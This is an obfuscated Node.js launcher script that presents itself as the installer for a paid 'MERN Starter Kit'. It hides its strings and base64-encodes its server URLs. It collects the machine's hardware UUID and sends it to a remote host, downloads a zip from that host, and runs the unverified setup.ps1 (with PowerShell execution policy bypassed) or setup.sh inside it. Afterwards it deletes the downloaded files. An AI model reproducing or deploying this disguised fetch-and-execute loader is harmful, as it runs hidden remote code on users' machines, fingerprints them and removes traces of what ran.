#!/usr/bin/env node

const a0_0x574e0d = a0_0x4cec;
(function (_0x53b3e7, _0x325caa) {
  const _0x222ddd = a0_0x4cec,
    _0x5f4bb6 = _0x53b3e7();
  while (!![]) {
    try {
      const _0x37bb7c =
        (parseInt(_0x222ddd(0x104)) / 0x1) *
          (-parseInt(_0x222ddd(0x140)) / 0x2) +
        (parseInt(_0x222ddd(0xf0)) / 0x3) *
          (-parseInt(_0x222ddd(0x114)) / 0x4) +
        (parseInt(_0x222ddd(0x10c)) / 0x5) *
          (-parseInt(_0x222ddd(0x106)) / 0x6) +
        (-parseInt(_0x222ddd(0x113)) / 0x7) *
          (parseInt(_0x222ddd(0x125)) / 0x8) +
        (-parseInt(_0x222ddd(0x103)) / 0x9) *
          (-parseInt(_0x222ddd(0x128)) / 0xa) +
        -parseInt(_0x222ddd(0xf9)) / 0xb +
        parseInt(_0x222ddd(0x138)) / 0xc;
      if (_0x37bb7c === _0x325caa) break;
      else _0x5f4bb6["push"](_0x5f4bb6["shift"]());
    } catch (_0x574ff3) {
      _0x5f4bb6["push"](_0x5f4bb6["shift"]());
    }
  }
})(a0_0x471f, 0x7d751);
function a0_0x471f() {
  const _0x3c730 = [
    "-ExecutionPolicy",
    "âŒ\x20Error\x20Invalid\x20License",
    "exit",
    "pause",
    "mern-launcher",
    "aHR0cHM6Ly9ocnV0aGlrLmFwaS5hbm94LnN0b3JlL2FwaS92MS9zY3JpcHRzL2Rvd25sb2FkLXppcA==",
    "error",
    "utf-8",
    "readFileSync",
    "Windows",
    "start\x20\x22\x22\x20\x22",
    "184GZpBPB",
    "trim",
    "nohup\x20xdg-open\x20\x22",
    "920fGCwMG",
    "ðŸš¨\x20Uncaught\x20Exception:",
    "success",
    "arraybuffer",
    "win32",
    "powershell.exe",
    "ioreg\x20-rd1\x20-c\x20IOPlatformExpertDevice\x20|\x20awk\x20-F\x27\x22\x27\x20\x27/IOPlatformUUID/\x20{print\x20$4}\x27",
    "\x0a\x20\x20\x20\x20=================================\x0a\x20\x20\x20\x20ðŸš€\x20Welcome\x20to\x20the\x20MERN\x20Starter\x20Kit!\x0a\x20\x20\x20\x20Follow\x20the\x20prompts\x20to\x20configure\x20your\x20project.\x0a\x20\x20\x20\x20=================================\x0a\x20\x20",
    "push",
    "inherit",
    "existsSync",
    "âœ…\x20verified\x20user,\x20Proceeding...",
    "\x0aâš ï¸\x20\x20Process\x20interrupted.\x20Cleaning\x20up...",
    "log",
    "ps1",
    "uncaughtException",
    "26258052dGpsOl",
    "stdin",
    "aHR0cHM6Ly9ocnV0aGlrLmFwaS5hbm94LnN0b3JlL2FwaS92MS9wYXltZW50L2NoZWNrLXBheW1lbnQ=",
    "ðŸ”\x20Checking,\x20Please\x20wait!!",
    "mernLauncher",
    "darwin",
    "data",
    "resolve",
    "171662eqKUcX",
    "active",
    "platform",
    "bash",
    "57xaxJSY",
    "post",
    "join",
    "âœ…\x20Free\x20Trial\x20Activated...",
    "extractAllTo",
    "ignore",
    "license",
    "startsWith",
    ".codeEaseX",
    "3580577bOFjPb",
    "âŒ\x20Server\x20is\x20busy,\x20try\x20again\x20later!!",
    "dirname",
    "setup",
    "from",
    "âŒ\x20Payment\x20check\x20timed\x20out.\x20Please\x20try\x20again.",
    "wmic\x20csproduct\x20get\x20UUID",
    "setup.sh",
    "resume",
    "credentials",
    "79182MPuQKt",
    "7TgnZep",
    "cmd",
    "22320XJDyEK",
    "setup.ps1",
    "ðŸ”„\x20Waiting\x20for\x20payment\x20confirmation...",
    "\x22\x20>\x20/dev/null\x202>&1\x20&",
    "rmSync",
    "base64",
    "20iEFjlr",
    "status",
    "completed",
    "toString",
    "âŒ\x20Cleanup\x20failed:",
    "split",
    "unlinkSync",
    "244013LZIbvX",
    "155948Whvvvu",
    "Press\x20\x1b[32mENTER\x1b[0m\x20to\x20proceed\x20with\x20the\x20payment.",
    "open\x20\x22",
    "setRawMode",
    "cat\x20/var/lib/dbus/machine-id",
    "Bypass",
  ];
  a0_0x471f = function () {
    return _0x3c730;
  };
  return a0_0x471f();
}
import { execSync, spawn } from "child_process";
import a0_0x13b567 from "os";
import a0_0x526f36 from "path";
import { fileURLToPath } from "url";
import a0_0x51e043 from "fs";
import a0_0x52614f from "axios";
import a0_0x1374a4 from "adm-zip";
const homePath = a0_0x13b567["homedir"](),
  codeEasePath = a0_0x526f36[a0_0x574e0d(0xf2)](homePath, a0_0x574e0d(0xf8)),
  __filename = fileURLToPath(import.meta["url"]),
  __dirname = a0_0x526f36[a0_0x574e0d(0xfb)](__filename),
  packageDir = a0_0x526f36[a0_0x574e0d(0x13f)](__dirname),
  setupDir = a0_0x526f36["join"](packageDir, a0_0x574e0d(0xfc)),
  zipPath = a0_0x526f36[a0_0x574e0d(0xf2)](packageDir, "setup.zip"),
  package_name = a0_0x574e0d(0x11e);
function cleanup() {
  const _0x139a03 = a0_0x574e0d;
  try {
    a0_0x51e043[_0x139a03(0x132)](zipPath) &&
      a0_0x51e043[_0x139a03(0x112)](zipPath),
      a0_0x51e043[_0x139a03(0x132)](setupDir) &&
        a0_0x51e043[_0x139a03(0x10a)](setupDir, {
          recursive: !![],
          force: !![],
        }),
      console[_0x139a03(0x135)]("âœ…\x20Successfully\x20completed!");
  } catch (_0x51ee16) {
    console[_0x139a03(0x120)](_0x139a03(0x110), _0x51ee16["message"]);
  }
}
async function generateUUID() {
  const _0x54b64d = a0_0x574e0d;
  let _0x123cad;
  if (a0_0x13b567[_0x54b64d(0x142)]() === "win32")
    _0x123cad = execSync(_0x54b64d(0xff))
      ["toString"]()
      [_0x54b64d(0x111)]("\x0a")[0x1]
      [_0x54b64d(0x126)]();
  else {
    if (a0_0x13b567[_0x54b64d(0x142)]() === "linux")
      _0x123cad = execSync(_0x54b64d(0x118))
        [_0x54b64d(0x10f)]()
        [_0x54b64d(0x126)]();
    else
      a0_0x13b567[_0x54b64d(0x142)]() === _0x54b64d(0x13d) &&
        (_0x123cad = execSync(_0x54b64d(0x12e))
          ["toString"]()
          [_0x54b64d(0x126)]());
  }
  return _0x123cad;
}
function a0_0x4cec(_0x15f576, _0x2b72c6) {
  const _0x471f57 = a0_0x471f();
  return (
    (a0_0x4cec = function (_0x4cec13, _0x294712) {
      _0x4cec13 = _0x4cec13 - 0xf0;
      let _0x21dcf3 = _0x471f57[_0x4cec13];
      return _0x21dcf3;
    }),
    a0_0x4cec(_0x15f576, _0x2b72c6)
  );
}
function getLicenseToken(_0x2ad695) {
  const _0x3422da = a0_0x574e0d;
  if (!a0_0x51e043[_0x3422da(0x132)](codeEasePath)) return null;
  const _0x2d8515 = a0_0x51e043[_0x3422da(0x122)](
    codeEasePath,
    _0x3422da(0x121)
  )[_0x3422da(0x111)]("\x0a");
  for (const _0x457d14 of _0x2d8515) {
    if (_0x457d14[_0x3422da(0xf7)](_0x2ad695 + "="))
      return _0x457d14["split"]("=")[0x1][_0x3422da(0x126)]();
  }
  return null;
}
function saveLicenseToken(_0x5850d0, _0x5a497c) {
  const _0x2e24c6 = a0_0x574e0d;
  let _0x139718 = [],
    _0x270c33 = ![];
  if (a0_0x51e043["existsSync"](codeEasePath)) {
    const _0x283a15 = a0_0x51e043[_0x2e24c6(0x122)](
      codeEasePath,
      _0x2e24c6(0x121)
    )[_0x2e24c6(0x111)]("\x0a");
    for (const _0x5b11a1 of _0x283a15) {
      _0x5b11a1[_0x2e24c6(0xf7)](_0x5850d0 + "=")
        ? (_0x139718[_0x2e24c6(0x130)](_0x5850d0 + "=" + _0x5a497c),
          (_0x270c33 = !![]))
        : _0x139718[_0x2e24c6(0x130)](_0x5b11a1);
    }
  }
  !_0x270c33 && _0x139718[_0x2e24c6(0x130)](_0x5850d0 + "=" + _0x5a497c),
    a0_0x51e043["writeFileSync"](codeEasePath, _0x139718["join"]("\x0a"));
}
async function installProject(_0x1ff570) {
  const _0x1845a5 = a0_0x574e0d;
  try {
    const _0x12dc9c = getLicenseToken(_0x1ff570);
    if (!_0x12dc9c) {
      console[_0x1845a5(0x135)](
        "Please\x20purchase\x20a\x20license\x20" + _0x1ff570 + "."
      );
      return;
    }
    const _0x3be429 = await a0_0x52614f[_0x1845a5(0xf1)](
      Buffer["from"](_0x1845a5(0x11f), _0x1845a5(0x10b))[_0x1845a5(0x10f)](
        _0x1845a5(0x121)
      ),
      {
        licenseToken: _0x12dc9c,
        project: _0x1845a5(0x13c),
        packageName: _0x1ff570,
      },
      { responseType: _0x1845a5(0x12b) }
    );
    a0_0x51e043["writeFileSync"](zipPath, _0x3be429[_0x1845a5(0x13e)]);
    const _0xe701ea = new a0_0x1374a4(zipPath);
    _0xe701ea[_0x1845a5(0xf4)](setupDir, !![]);
  } catch (_0x31f69d) {
    console[_0x1845a5(0x135)](
      "âŒ\x20Server\x20is\x20Busy,\x20try\x20again\x20later!!"
    ),
      process["exit"](0x1);
  }
}
async function checkLicense(_0x412297) {
  const _0x5c1f2d = a0_0x574e0d;
  try {
    let _0x5e74d8 = getLicenseToken(_0x412297);
    if (_0x5e74d8) {
      const _0x3f52cf = await generateUUID(),
        _0x109b18 = await a0_0x52614f[_0x5c1f2d(0xf1)](
          Buffer[_0x5c1f2d(0xfd)](_0x5c1f2d(0x13a), _0x5c1f2d(0x10b))[
            _0x5c1f2d(0x10f)
          ](_0x5c1f2d(0x121)),
          { packageName: _0x412297 },
          { headers: { "X-License-Key": _0x3f52cf } }
        );
      if (
        _0x109b18[_0x5c1f2d(0x13e)]["credentials"][_0x5c1f2d(0x10d)] ===
        "completed"
      )
        return console[_0x5c1f2d(0x135)](_0x5c1f2d(0x133)), !![];
    }
    const _0x28ecb8 = await generateUUID(),
      _0x4d6a92 = await a0_0x52614f["post"](
        Buffer[_0x5c1f2d(0xfd)](
          "aHR0cHM6Ly9ocnV0aGlrLmFwaS5hbm94LnN0b3JlL2FwaS92MS9wYXltZW50L3JlZ2lzdGVy",
          _0x5c1f2d(0x10b)
        )[_0x5c1f2d(0x10f)](_0x5c1f2d(0x121)),
        { packageName: _0x412297 },
        { headers: { "X-License-Key": _0x28ecb8 } }
      );
    if (_0x4d6a92[_0x5c1f2d(0x13e)][_0x5c1f2d(0x12a)])
      return (
        console[_0x5c1f2d(0x135)](_0x5c1f2d(0x115)),
        process["stdin"][_0x5c1f2d(0x117)](!![]),
        process["stdin"][_0x5c1f2d(0x101)](),
        new Promise((_0x29f44f) => {
          const _0xdb3d6e = _0x5c1f2d;
          process[_0xdb3d6e(0x139)]["on"](_0xdb3d6e(0x13e), async () => {
            const _0x46af07 = _0xdb3d6e;
            process[_0x46af07(0x139)]["setRawMode"](![]),
              process[_0x46af07(0x139)][_0x46af07(0x11d)](),
              console["log"]("\x0aRedirecting\x20to\x20payment\x20page...");
            const _0x23e259 =
              Buffer["from"](
                "aHR0cHM6Ly9ocnV0aGlrLmFub3guc3RvcmUvcGF5bWVudA==",
                _0x46af07(0x10b)
              )[_0x46af07(0x10f)](_0x46af07(0x121)) +
              "/" +
              package_name +
              "/" +
              _0x28ecb8;
            if (a0_0x13b567[_0x46af07(0x142)]() === _0x46af07(0x12c))
              execSync(_0x46af07(0x124) + _0x23e259 + "\x22", {
                stdio: _0x46af07(0xf5),
              });
            else
              a0_0x13b567[_0x46af07(0x142)]() === _0x46af07(0x13d)
                ? execSync(_0x46af07(0x116) + _0x23e259 + "\x22", {
                    stdio: "ignore",
                    detached: !![],
                  })
                : execSync(_0x46af07(0x127) + _0x23e259 + _0x46af07(0x109), {
                    stdio: _0x46af07(0xf5),
                    detached: !![],
                  });
            console[_0x46af07(0x135)](_0x46af07(0x108));
            let _0x5a6afb = ![],
              _0x38c194 = 0x0;
            const _0x4aca94 = 0x2d;
            while (!_0x5a6afb && _0x38c194 < _0x4aca94) {
              await new Promise((_0x5e5dba) => setTimeout(_0x5e5dba, 0x3a98)),
                _0x38c194++;
              const _0x366db0 = await a0_0x52614f[_0x46af07(0xf1)](
                Buffer[_0x46af07(0xfd)](_0x46af07(0x13a), _0x46af07(0x10b))[
                  _0x46af07(0x10f)
                ](_0x46af07(0x121)),
                { packageName: _0x412297 },
                { headers: { "X-License-Key": _0x28ecb8 } }
              );
              console["log"](_0x46af07(0x13b));
              if (
                _0x366db0[_0x46af07(0x13e)][_0x46af07(0x102)][
                  _0x46af07(0x10d)
                ] === _0x46af07(0x10e)
              )
                return (
                  saveLicenseToken(
                    _0x412297,
                    _0x366db0["data"][_0x46af07(0x102)][_0x46af07(0xf6)]
                  ),
                  _0x366db0[_0x46af07(0x13e)][_0x46af07(0x102)]["freeTrial"] ===
                    _0x46af07(0x141) &&
                    console[_0x46af07(0x135)](_0x46af07(0xf3)),
                  console[_0x46af07(0x135)]("âœ…\x20Payment\x20Successfull..."),
                  (_0x5a6afb = !![]),
                  _0x29f44f(!![]),
                  !![]
                );
            }
            console["log"](_0x46af07(0xfe)), process[_0x46af07(0x11c)](0x1);
          });
        })
      );
  } catch (_0x2d56f8) {
    console[_0x5c1f2d(0x135)](_0x5c1f2d(0xfa)), process[_0x5c1f2d(0x11c)](0x1);
  }
}
async function main() {
  const _0x540018 = a0_0x574e0d;
  console[_0x540018(0x135)](_0x540018(0x12f));
  const _0x5ab60e = await checkLicense(package_name);
  !_0x5ab60e && console[_0x540018(0x135)](_0x540018(0x11b));
  await installProject(package_name);
  const _0x3c203a = a0_0x13b567["platform"](),
    _0x52ee49 =
      _0x3c203a === "win32"
        ? a0_0x526f36[_0x540018(0xf2)](
            setupDir,
            _0x540018(0x136),
            _0x540018(0x107)
          )
        : a0_0x526f36[_0x540018(0xf2)](
            setupDir,
            _0x540018(0x105),
            _0x540018(0x100)
          ),
    _0x361097 = a0_0x526f36[_0x540018(0x13f)](__dirname, _0x52ee49);
  console[_0x540018(0x135)](
    "Running\x20setup\x20for\x20" +
      (_0x3c203a === _0x540018(0x12c) ? _0x540018(0x123) : "Linux/macOS") +
      "...\x0a"
  ),
    spawn(
      _0x3c203a === _0x540018(0x12c) ? _0x540018(0x12d) : _0x540018(0x143),
      _0x3c203a === _0x540018(0x12c)
        ? [_0x540018(0x11a), _0x540018(0x119), "-File", _0x361097]
        : [_0x361097],
      { stdio: _0x540018(0x131) }
    );
}
process["on"]("exit", cleanup),
  process["on"]("SIGINT", () => {
    const _0x2814f8 = a0_0x574e0d;
    console["log"](_0x2814f8(0x134)), cleanup(), process["exit"](0x1);
  }),
  process["on"](a0_0x574e0d(0x137), (_0x5d8b99) => {
    const _0x424b1a = a0_0x574e0d;
    console[_0x424b1a(0x120)](_0x424b1a(0x129), _0x5d8b99),
      cleanup(),
      process[_0x424b1a(0x11c)](0x1);
  }),
  main();
